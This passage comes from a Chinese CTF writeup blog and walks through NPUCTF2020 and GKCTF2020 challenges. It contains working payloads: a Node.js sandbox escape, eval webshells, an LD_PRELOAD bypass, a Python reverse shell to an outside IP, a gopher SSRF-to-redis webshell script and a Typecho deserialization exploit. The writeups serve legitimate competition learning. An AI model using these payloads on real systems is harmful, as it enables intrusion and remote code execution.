class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function">(<span class="params"><span class="built_in">Math</span></span>)=&gt;</span>(<span class="built_in">Math</span>=<span class="built_in">Math</span>.constructor,<span class="built_in">Math</span>.constructor(<span class="built_in">Math</span>.fromCharCode(...))))(<span class="built_in">Math</span>+<span class="number">1</span>)()</span><br></pre></td></tr></table></figure><p>分析一下</p><p>开头的Math是箭头函数。需要接受的参数。类似于function(Math)</p><p>(Math+1)是函数的参数，Math是个对象 与字符串1拼接后变成一个字符串</p><p>最外面的小括号。是JS的立即执行函数。定义函数后调用</p><p>中间一长串就是函数体了</p><p><img src="/2020/05/NPUCTF2020-复现/image-20200605113220410.png" alt="image-20200605113220410"></p><p>生成命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span><span class="params">(cmd)</span>:</span></span><br><span class="line">  s = <span class="string">f"return process.mainModule.require('child_process').execSync('<span class="subst">&#123;cmd&#125;</span>').toString()"</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">','</span>.join([str(ord(i)) <span class="keyword">for</span> i <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(gen(<span class="string">'cat /flag'</span>))</span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;"e":"(Math=&gt;(Math=Math.constructor,Math=Math.constructor(Math.fromCharCode(<span class="number">114,101,116,117</span>,<span class="number">114,110,32,112</span>,<span class="number">114,111,99,101</span>,<span class="number">115,115,46,109</span>,<span class="number">97,105,110,77</span>,<span class="number">111,100,117,108</span>,<span class="number">101,46,114,101</span>,<span class="number">113,117,105,114</span>,<span class="number">101,40,39,99</span>,<span class="number">104,105,108,100</span>,<span class="number">95,112,114,111</span>,<span class="number">99,101,115,115</span>,<span class="number">39,41,46,101</span>,<span class="number">120,101,99,83</span>,<span class="number">121,110,99,40</span>,<span class="number">39,99,97,116</span>,<span class="number">32,47,102,108</span>,<span class="number">97,103,39,41</span>,<span class="number">46,116,111,83</span>,<span class="number">116,114,105,110</span>,<span class="number">103,40,41</span>))()))(Math+<span class="number">1</span>)","first":"<span class="number">1</span>","second":[<span class="number">1</span>]&#125;</span><br></pre></td></tr></table></figure><p>不要忘了把修改把Content-Type 修改成<code>application/json</code></p>]]></content>
    
    <summary type="html">
    
      补作业了
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="复现" scheme="https://0xcreed.jxustctf.top/tags/%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>GKCTF2020-WP</title>
    <link href="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/"/>
    <id>https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/</id>
    <published>2020-05-24T05:00:18.000Z</published>
    <updated>2020-05-26T09:27:24.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-Check-IN"><a href="#1-Check-IN" class="headerlink" title="1.Check IN"></a>1.Check IN</h3><p><img src="/2020/05/GKCTF2020-Writeup/image-20200524132441686.png" alt="image-20200524132441686"></p><p>进去就是一个马</p><p>执行phpinfo后发现，禁用了执行命令的系统函数，但putenv未被禁用，所以想到劫持动态库执行命令。</p><p>先用蚁剑连接</p><p>构造如下URL，<a href="http://384607b7-c341-452f-b732-101819a34a69.node3.buuoj.cn/?Ginkgo=QGV2YWwoJF9QT1NUWydhJ10pOw==密码是a" target="_blank" rel="noopener">http://384607b7-c341-452f-b732-101819a34a69.node3.buuoj.cn/?Ginkgo=QGV2YWwoJF9QT1NUWydhJ10pOw==密码是a</a></p><a id="more"></a><p>或者修改编码器</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200524133145293.png" alt="image-20200524133145293"></p><p>上传恶意<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">so文件和bypass.php</a>接着读flag</p><p><code>http://384607b7-c341-452f-b732-101819a34a69.node3.buuoj.cn/?Ginkgo=QGV2YWwoJF9HRVRbJ2EnXSk7Cg==&amp;a=include(%27/var/tmp/1.php%27);&amp;cmd=./../../../readflag&amp;outpath=/tmp/123.txt&amp;sopath=/var/tmp/1.so</code></p><h3 id="2-老八小超市儿"><a href="#2-老八小超市儿" class="headerlink" title="2.老八小超市儿"></a>2.老八小超市儿</h3><p>用的是shopxo模板，这里有个后台Getshell的漏洞。具体看这篇<a href="http://www.nctry.com/1660.html" target="_blank" rel="noopener">文章</a></p><p>拿到shell用蚁剑连</p><p><a href="http://20e6504f-9a68-4272-b02b-4de366165b48.node3.buuoj.cn/public/static/index/default/1.php" target="_blank" rel="noopener">http://20e6504f-9a68-4272-b02b-4de366165b48.node3.buuoj.cn/public/static/index/default/1.php</a></p><p>然后发现根目录下有flag</p><p>告诉我们flag在根目录</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200524145719302.png" alt="image-20200524145719302"></p><p>flag.hint有点奇怪</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200524145846453.png" alt="image-20200524145846453"></p><p>直到看到auto.sh，原来是个定时任务</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200524145602985.png" alt="image-20200524145602985"></p><p>接着修改makeflaghint.py遍历/root/</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">path_list = []</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all</span><span class="params">(path)</span>:</span></span><br><span class="line">    paths = os.listdir(path)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> paths:</span><br><span class="line">        com_path = os.path.join(path,i)</span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(com_path):</span><br><span class="line">            get_all(com_path)</span><br><span class="line">        <span class="keyword">elif</span> os.path.isfile(com_path):</span><br><span class="line">            path_list.append(com_path)</span><br><span class="line">        <span class="keyword">with</span>  open(<span class="string">'/flag.hint'</span>,<span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(com_path+<span class="string">'\n'</span>)</span><br><span class="line">        print(com_path) </span><br><span class="line">get_all(path=<span class="string">r'/root'</span>)</span><br></pre></td></tr></table></figure><p><img src="/2020/05/GKCTF2020-Writeup/20232423444217.png" alt="20232423444217"></p><p>发现flag接着读取就行</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">f1=<span class="built_in">open</span>(<span class="string">"/root/flag"</span>)</span><br><span class="line">aaa=f1.<span class="built_in">read</span>()</span><br><span class="line">f1.<span class="built_in">close</span>()</span><br><span class="line"><span class="keyword">with</span>  <span class="built_in">open</span>(<span class="string">'/flag.hint'</span>,<span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.<span class="built_in">write</span>(aaa+<span class="string">'\n'</span>)</span><br><span class="line">print(<span class="string">"D"</span>)</span><br></pre></td></tr></table></figure><p><img src="/2020/05/GKCTF2020-Writeup/image-20200524145546293.png" alt="image-20200524145546293"></p><p>后面看官方WP是反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"174.1.118.22"</span>,<span class="number">2333</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>])</span><br></pre></td></tr></table></figure><h3 id="3-CVE版签到"><a href="#3-CVE版签到" class="headerlink" title="3.CVE版签到"></a>3.CVE版签到</h3><p>开始没看懂这题在干啥，后面提示<a href="https://bugs.php.net/bug.php?id=79329" target="_blank" rel="noopener">CVE-2020-7066</a> gethead函数存在%00截断</p><p>就试了文章里的Payload发现啥也没有。直到看了WP才发现原来都是Burp的锅</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200525105018707.png" alt="image-20200525105018707"></p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200525105045473.png" alt="image-20200525105045473"></p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200525105141216.png" alt="image-20200525105141216"></p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200525105212253.png" alt="image-20200525105212253"></p><p>这题确实签到(放了提示)，感觉主要考对最新一些的CVE的了解。偏实战，爱了爱了。</p><h3 id="4-EZ三剑客-EzWeb"><a href="#4-EZ三剑客-EzWeb" class="headerlink" title="4.EZ三剑客-EzWeb"></a>4.EZ三剑客-EzWeb</h3><p>这题SSRF+redis未授权，但是shell死活收不到。后面看WP发现是独立于单容器的内网，内网靶机收不到反弹shell。所以是直接写webshell。</p><p>开局就叫你输入URL，八成是个SSRF，就随意输入了127.0.0.1，发现被禁了。然后就想着怎么绕(后面发现不用。。。)</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200525110646995.png" alt="image-20200525110646995"></p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200525110728289.png" alt="image-20200525110728289"></p><p>发现<code>0x7f000001</code> 可以绕过。后面用Burp抓包，想扫描下本机端口，看到才看到secret这个参数</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200525111239096.png" alt="image-20200525111239096"></p><p>得到了本机的内网IP</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200525111352798.png" alt="image-20200525111352798"></p><p>这样一看肯定就不是本机的端口渗透，应该在内网的其他机器上，然后内网探测，很明显的提示了</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200525112129001.png" alt="image-20200525112129001"></p><p>然后就随意测了下6379端口，发现有戏</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200525112303602.png" alt="image-20200525112303602"></p><p>直接用脚本生成payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/python3<span class="number">.8</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">"gopher://"</span></span><br><span class="line">ip=<span class="string">"173.31.59.11"</span></span><br><span class="line">port=<span class="string">"6379"</span></span><br><span class="line">shell=<span class="string">"\n\n&lt;?php eval($_GET['a']);?&gt;\n\n"</span></span><br><span class="line">filename=<span class="string">"1.php"</span></span><br><span class="line">path=<span class="string">"/var/www/html"</span></span><br><span class="line">passwd=<span class="string">""</span></span><br><span class="line">cmd=[<span class="string">"flushall"</span>,</span><br><span class="line">     <span class="string">"set 1 &#123;&#125;"</span>.format(shell.replace(<span class="string">" "</span>,<span class="string">"$&#123;IFS&#125;"</span>)),</span><br><span class="line">     <span class="string">"config set dir &#123;&#125;"</span>.format(path),</span><br><span class="line">     <span class="string">"config set dbfilename &#123;&#125;"</span>.format(filename),</span><br><span class="line">     <span class="string">"save"</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">    CRLF=<span class="string">"\r\n"</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">    cmd=<span class="string">""</span></span><br><span class="line">    cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">"$"</span>+str(len((x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>))))+CRLF+x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.request.quote(redis_format(x))</span><br><span class="line">    print(payload)</span><br></pre></td></tr></table></figure><p><img src="/2020/05/GKCTF2020-Writeup/image-20200525130359211.png" alt="image-20200525130359211"></p><p>接着测试webshell</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200525130438217.png" alt="image-20200525130438217"></p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200525131721234.png" alt="image-20200525131721234"></p><h3 id="5-EZ三剑客-EzTypecho"><a href="#5-EZ三剑客-EzTypecho" class="headerlink" title="5.EZ三剑客-EzTypecho"></a>5.EZ三剑客-EzTypecho</h3><p>拿到题目源码后发现是0.9版本，先去github下了个0.9版本，然后用对比工具比较install.php</p><p>发现<code>session_start();</code>被注释</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200525135740889.png" alt="image-20200525135740889"></p><p>关键代码</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200525140208760.png" alt="image-20200525140208760"></p><p>首先要反序列化就要SESSION，但<code>session_start();</code>被注释，可以通过以下方法绕过</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200525140624669.png" alt="image-20200525140624669"></p><p><a href="https://www.freebuf.com/vuls/155753.html" target="_blank" rel="noopener">Typecho反序列化的文章</a></p><p>poc.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$CMD = <span class="string">'system("cat /flag")'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> RSS2 = <span class="string">'RSS 2.0'</span>;</span><br><span class="line">    <span class="keyword">const</span> ATOM1 = <span class="string">'ATOM 1.0'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $_type;</span><br><span class="line">    <span class="keyword">private</span> $_items;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//$this-&gt;_type = $this::RSS2;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_type = <span class="keyword">$this</span>::ATOM1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items[<span class="number">0</span>] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'category'</span> =&gt; <span class="keyword">array</span>(<span class="keyword">new</span> Typecho_Request()),</span><br><span class="line">            <span class="string">'author'</span> =&gt; <span class="keyword">new</span> Typecho_Request(),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_params[<span class="string">'screenName'</span>] = $GLOBALS[CMD];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">'assert'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exp = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'adapter'</span> =&gt; <span class="keyword">new</span> Typecho_Feed(),</span><br><span class="line">    <span class="string">'prefix'</span>  =&gt; <span class="string">'typecho_'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($exp));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">'http://97caa567-ba9d-4f95-825b-14bebe796a6e.node3.buuoj.cn/install.php?finish=1'</span></span><br><span class="line">files=&#123;<span class="string">'file'</span>:<span class="number">123</span>&#125;</span><br><span class="line">headers=&#123;<span class="string">'cookie'</span>:<span class="string">'PHPSESSID=test;__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6Mjp7czo4OiJjYXRlZ29yeSI7YToxOntpOjA7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czoxOToic3lzdGVtKCJjYXQgL2ZsYWciKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjE5OiJzeXN0ZW0oImNhdCAvZmxhZyIpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX1zOjY6InByZWZpeCI7czo4OiJ0eXBlY2hvXyI7fQ=='</span>,</span><br><span class="line"> <span class="string">'Referer'</span>:<span class="string">'http://97caa567-ba9d-4f95-825b-14bebe796a6e.node3.buuoj.cn/install.php'</span>&#125;</span><br><span class="line">re=requests.post(url,files=files,headers=headers,data=&#123;<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span>: <span class="string">"123456789"</span>&#125;)</span><br><span class="line">print(re.text)</span><br></pre></td></tr></table></figure><h3 id="6-EZ三剑客-EzNode"><a href="#6-EZ三剑客-EzNode" class="headerlink" title="6.EZ三剑客-EzNode"></a>6.EZ三剑客-EzNode</h3><p>首先看源码，发现delay被设置的很大，执行命令会超时，在node.js<a href="http://nodejs.cn/api/timers.html#timers_settimeout_callback_delay_args" target="_blank" rel="noopener">文档中</a>指出 <code>当</code>delay<code>大于</code>2147483647<code>或小于</code>1<code>时，则</code>delay<code>将会被设置为</code>1<code>。 非整数的 delay 会被截断为整数</code></p><p>然后题目很奇怪给了包的版本信息，感觉应该是 有公开漏洞</p><p>在<a href="https://github.com/advisories" target="_blank" rel="noopener">github advisories</a>找到了漏洞信息</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200525151514661.png" alt="image-20200525151514661"></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="1-Pokemon"><a href="#1-Pokemon" class="headerlink" title="1. Pokémon"></a>1. Pokémon</h3><p>GBA游戏，直接去103号道路，道路上就是flag</p><h3 id="2-Harley-Quinn"><a href="#2-Harley-Quinn" class="headerlink" title="2.Harley Quinn"></a>2.Harley Quinn</h3><p>题目信息隐藏的挺细致的，导致一直懵逼。</p><p>先是压缩包的属性里有解密的信息</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200526105114519.png" alt="image-20200526105114519"></p><p>然后根据题目描述下载Free_File_Camouflage V1.25</p><p>解压后，有个wav音频文件，属性里也有信息</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200526105632498.png" alt="image-20200526105632498"></p><p>提示密码有21位</p><p>音频用Sonic Visualiser打开后发现末尾有播音号 可以自己手动解，或者用</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200526105730727.png" alt="image-20200526105730727"></p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200526113701783.png" alt="image-20200526113701783"></p><p>接着用九宫格密码解</p><p>222按3下2键就是c，后面同理</p><p><img src="/2020/05/GKCTF2020-Writeup/clip_image001.png" alt="img"></p><p>最后解出 <code>ctfisfun</code></p><p>然后用然后用软件</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200526155704949.png" alt="image-20200526155704949"></p><h3 id="3-code-obfuscation"><a href="#3-code-obfuscation" class="headerlink" title="3.code obfuscation"></a>3.code obfuscation</h3><p>附件是个扭曲的二维码</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200526161615952.png" alt="image-20200526161615952"></p><p>然后binwalke可以分解出个要密码压缩包</p><p>接着修图，ps打开图片,选定好需要变换的区域，右键自由变换后再扭曲，然后截取下来</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200526161626648.png" alt="image-20200526161626648"></p><p>接着matlab处理</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200526161717329.png" alt="image-20200526161717329"></p><p>扫出来 <code>base(gkctf)</code></p><p>试了下解不了，可能要baseXX编码。然后用base58解出来了</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200526163147548.png" alt="image-20200526163147548"></p><p>解压后得到两个文件一个是js代码，一个是密文</p><p>js代码经过 混淆，利用<a href="http://tool.chinaz.com/js.aspx" target="_blank" rel="noopener">在线工具</a>解密后得到解密后的js代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> a b c d e f g h i j k l m n o p q r s t u v w x y z <span class="keyword">do</span> <span class="built_in">eval</span> An = <span class="string">"n"</span></span><br><span class="line">    done</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> A B C D E F G H I J K L M N O P Q R S T U V W X Y Z <span class="keyword">do</span> <span class="built_in">eval</span> An = <span class="string">"n"</span></span><br><span class="line">    done</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> a b c d e f g h i j <span class="keyword">do</span> <span class="built_in">eval</span> Bn = <span class="string">"n"</span></span><br><span class="line">    num =</span><br><span class="line">    $((num + <span class="number">1</span>)) done alert(<span class="string">"Bk=' ';Bm='"</span></span><br><span class="line">        ';Bn='#</span><br><span class="line">        <span class="string">';Bs='</span> (<span class="string">';Bt='</span>)</span><br><span class="line">        <span class="string">';By='</span>.</span><br><span class="line">        <span class="string">';Cb='</span>;</span><br><span class="line">        <span class="string">';Cc='</span> &lt; <span class="string">';Ce='</span> &gt; <span class="string">';Cl='</span></span><br><span class="line">        _ <span class="string">';Cn='</span> &#123;</span><br><span class="line">            <span class="string">';Cp='</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="string">';Da='</span></span><br><span class="line">        <span class="number">0</span> <span class="string">';Db='</span></span><br><span class="line">        <span class="number">1</span> <span class="string">';Dc='</span></span><br><span class="line">        <span class="number">2</span> <span class="string">';Dd='</span></span><br><span class="line">        <span class="number">3</span> <span class="string">';De='</span></span><br><span class="line">        <span class="number">4</span> <span class="string">';Df='</span></span><br><span class="line">        <span class="number">5</span> <span class="string">';Dg='</span></span><br><span class="line">        <span class="number">6</span> <span class="string">';Dh='</span></span><br><span class="line">        <span class="number">7</span> <span class="string">';Di='</span></span><br><span class="line">        <span class="number">8</span> <span class="string">';Dj='</span></span><br><span class="line">        <span class="number">9</span> <span class="string">';")</span></span><br></pre></td></tr></table></figure><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">b = <span class="string">"Bn$Ai$An$Ac$Al$Au$Ad$Ae$Bk$Cc$As$At$Ad$Ai$Ao$By$Ah$Ce$Ai$An$At$Bk$Am$Aa$Ai$An$Bs$Bt$Cn$Ap$Ar$Ai$An$At$Bs$Bm$Aw$Dd$Al$Ac$Da$Am$Ae$Cl$De$Ao$Cl$Dj$Ak$Ac$At$Df$Bm$Bt$Cb$Ar$Ae$At$Au$Ar$An$Bk$Da$Cb$Cp"</span></span><br><span class="line"></span><br><span class="line">c = &#123;<span class="string">"Bk"</span>: <span class="string">' '</span>, <span class="string">"Bm"</span>: <span class="string">'"'</span>, <span class="string">"Bn"</span>: <span class="string">'#'</span>, <span class="string">"Bs"</span>: <span class="string">'('</span>, <span class="string">"Bt"</span>: <span class="string">')'</span>, <span class="string">"By"</span>: <span class="string">'.'</span>, <span class="string">"Cb"</span>: <span class="string">','</span>, <span class="string">"Cc"</span>: <span class="string">'&lt;'</span>, <span class="string">"Ce"</span>: <span class="string">'&gt;'</span>, <span class="string">"Cl"</span>: <span class="string">'_'</span>,</span><br><span class="line">     <span class="string">"Cn"</span>: <span class="string">'&#123;'</span>, <span class="string">"Cp"</span>: <span class="string">'&#125;'</span>, <span class="string">"Da"</span>: <span class="string">'0'</span>, <span class="string">"Db"</span>: <span class="string">'1'</span>, <span class="string">"Dc"</span>: <span class="string">'2'</span>, <span class="string">"Dd"</span>: <span class="string">'3'</span>, <span class="string">"De"</span>: <span class="string">'4'</span>, <span class="string">"Df"</span>: <span class="string">'5'</span>, <span class="string">"Dg"</span>: <span class="string">'6'</span>, <span class="string">"Dh"</span>: <span class="string">'7'</span>,</span><br><span class="line">     <span class="string">"Di"</span>: <span class="string">'8'</span>, <span class="string">"Dj"</span>: <span class="string">'9'</span>&#125;</span><br><span class="line">f = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b.split(<span class="string">'$'</span>):</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> c.keys():</span><br><span class="line">        f = f + c[i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f = f + i[<span class="number">1</span>]</span><br><span class="line"></span><br><span 